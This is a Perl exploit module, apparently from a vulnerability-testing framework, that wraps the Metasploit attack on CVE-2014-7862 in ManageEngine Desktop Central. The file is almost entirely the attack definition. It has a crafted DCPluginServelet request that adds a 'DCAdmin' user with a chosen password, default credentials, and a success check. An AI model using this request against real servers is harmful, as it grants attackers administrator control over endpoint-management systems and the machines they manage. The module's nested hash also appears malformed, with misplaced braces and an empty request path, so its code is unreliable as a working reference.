package MANAGE::MSF::ManageEngineDcCreateAdmin;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "ManageEngineDcCreateAdmin";

   my $DETECTION = {

   };

my $EXPLOIT = {
  "CVE" => "CVE-2014-7862",
  "DESCRIPTION" => "

        This module exploits an administrator account creation vulnerability in Desktop Central

        from v7 onwards by sending a crafted request to DCPluginServelet. It has been tested in

        several versions of Desktop Central (including MSP) from v7 onwards.

      ",
  "METHOD" => "GET",
  "MSF_MODULE" => "manage_engine_dc_create_admin",
  "OSVDB" => 116554,
  "PATH" => "action=addPlugInUser&role=DCAdmin&userName=__USERNAME__&email=__EMAIL__&phNumber=__PHNUMBER__&password=__PASSWORD__&salt=__SALT__&createdtime=__CREATEDTIME__&",
  "PATHS" => [""],
  "REFERENCES" => [
    "http://seclists.org/fulldisclosure/2015/Jan/2",
    "https://github.com/pedrib/PoC/blob/master/advisories/ManageEngine/me_dc9_admin.txt",
  ],
  "THE USERTITLE FOR THE NEW ADMIN ACCOUNT" => "msf",
  "TITLE" => "ManageEngine Desktop Central Administrator Account Creation",
  VARIABLES => {
    'USERNAME' =>       { DESCRIPTION => "", VALUE => "" },
    'SALT' =>       { DESCRIPTION => "", VALUE => "" },
    'PHNUMBER' =>       { DESCRIPTION => "", VALUE => "" },
    'PATH' =>       { DESCRIPTION => "ManageEngine Desktop Central URI", VALUE => "/" },
    'CREATEDTIME' =>       { DESCRIPTION => "", VALUE => "" },
    'PASSWORD' =>       {
  DESCRIPTION => "The password for the new admin account",
  VALUE => "password",
},
    'EMAIL' =>       {
  DESCRIPTION => "The email for the new admin account",
  VALUE => "msf\@email.loc",
},
  },
      },  VALIDATION => {
    'TSTRING' =>       "sucess",

  TYPE => 'MSF',
  PLATFORM => 'ALL',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'GET',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #1 Request : [GET] ',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
